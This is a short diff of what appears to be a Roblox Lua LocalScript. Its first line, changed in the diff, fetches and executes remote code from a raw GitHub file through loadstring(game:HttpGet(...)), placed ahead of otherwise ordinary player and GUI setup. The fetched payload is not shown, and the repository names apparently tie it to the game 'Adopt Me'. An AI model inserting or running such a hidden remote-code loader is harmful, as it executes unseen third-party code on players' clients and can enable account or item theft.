@@ -1,4 +1,4 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/turkeyjhonny/ADOPTMESCRIPT/refs/heads/main/ggmz.txt'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/turkeyjhonny/ADOPTMEBESTSCRIPT/refs/heads/main/anojay.txt'))()
 -- Ensure this script is in StarterPlayerScripts as a LocalScript
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
